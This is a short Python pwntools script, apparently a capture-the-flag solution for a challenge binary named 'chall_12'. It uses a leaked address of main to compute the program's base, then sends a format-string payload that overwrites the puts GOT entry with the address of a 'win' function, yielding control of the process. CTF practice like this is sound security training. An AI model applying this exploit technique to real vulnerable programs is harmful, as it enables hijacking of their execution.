# coding: utf-8
from pwn import *
p = process("./chall_12")
elf = ELF("./chall_12")

p.recvuntil(b": ")
mainLeak = p.recvline()
mainLeak = int(mainLeak, 16)
mainOffset = elf.sym.main

base = mainLeak - mainOffset

winOffset = elf.sym.win
putsOffset = elf.got.puts

winAddr = base + winOffset
putsAddr = base + putsOffset

payload = fmtstr_payload(7, {putsAddr: winAddr})
p.sendline(payload)
p.interactive()
